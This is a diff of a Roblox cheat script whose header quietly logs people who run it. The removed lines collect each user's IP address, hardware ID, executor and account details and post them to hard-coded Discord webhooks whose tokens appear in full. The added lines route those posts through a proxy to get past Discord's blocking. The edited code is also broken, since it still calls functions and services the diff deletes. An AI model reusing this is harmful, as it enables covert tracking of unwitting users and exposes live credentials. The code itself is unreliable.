@@ -1,41 +1,29 @@
 -- [[ CONFIGURATION ]]
 local CONFIG = {
-    -- BOTH WEBHOOKS RECEIVE EVERY LOG
+    -- ADD YOUR LOGGER LINK AS THE THIRD ENTRY BELOW
     WEBHOOKS = {
         "https://discordapp.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3",
-        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx"
+        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx",
+        "YOUR_LOGGER_WEBHOOK_URL_HERE" -- < Put your link here
     },
     
-    -- WHITELIST STACK (ADD IDS VERTICALLY)
+    -- WHITELIST STACK
     WHITELIST = {
         10494322381,
-        00000000,
-        -- Add more here
+        -- Add more IDs here
     },
     
     KICK_MSG = "DM KERSAII ON DC"
 }
 
--- [[ SERVICES ]]
-local Players = game:GetService("Players")
-local Http = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-
--- [[ SECURITY FUNCTIONS ]]
-local Security = {}
-
-function Security:GetInfo()
-    local success, ipResult = pcall(function() return game:HttpGet("https://api.ipify.org") end)
-    return {
-        IP   = success and ipResult or "Failed to fetch",
-        HWID = (gethwid and gethwid()) or "Unsupported",
-        EXEC = (identifyexecutor and identifyexecutor()) or "Unknown",
-        AGE  = LP.AccountAge .. " days",
-        JOB  = game.JobId,
-        GAME = "https://www.roblox.com/games/" .. game.PlaceId
-    }
+-- [[ PROXY FIX ]]
+-- This function automatically replaces 'discord.com' with a proxy 
+-- so the request doesn't get blocked by Discord.
+local function UseProxy(url)
+    return url:gsub("discordapp.com", "hooks.hyra.io"):gsub("discord.com", "hooks.hyra.io")
 end
 
+-- [[ UPDATED LOG FUNCTION ]]
 function Security:Log(Status)
     local info = self:GetInfo()
     local isApproved = (Status == "APPROVED")
@@ -58,41 +46,17 @@ function Security:Log(Status)
         }}
     }
 
-    local data=Http:JSONEncode(payload)
+    local data = Http:JSONEncode(payload)
     
-    for _,url in pairs(CONFIG.WEBHOOKS) do
+    for _, url in pairs(CONFIG.WEBHOOKS) do
         task.spawn(function()
             pcall(function()
-                Http:PostAsync(url,data)
+                -- Using the Proxy function here
+                Http:PostAsync(UseProxy(url), data)
             end)
         end)
     end
 end
-
--- [[ EXECUTION GATE ]]
-local function Initialize()
-    local Auth=false
-    for _,id in pairs(CONFIG.WHITELIST) do
-        if LP.UserId==id then
-            Auth=true
-            break
-        end
-    end
-
-    if Auth then
-        Security:Log("APPROVED")
-    else
-        print('dm kersaii on dc')
-        Security:Log("DENIED")
-        task.wait(0.7) -- Delay to ensure both webhooks send before the kick
-        LP:Kick(CONFIG.KICK_MSG)
-        return false
-    end
-    return true
-end
-
-if not Initialize() then return end
-
 -- [[ PASTE YOUR 1000 LINE SCRIPT BELOW ]]
 for i,b in pairs(workspace.FE.Actions:GetChildren()) do
     if b.Name == " " then
@@ -1425,7 +1389,7 @@ Cezar5:Toggle({
 })
 
 -- ====================== BLOXTRAP TAB ======================
-local BloxtrapTab = false
+local BloxtrapTab = true
 BloxtrapTab:Section({ Title = "Bloxtrap Initiate" })
 
 BloxtrapTab:Button({
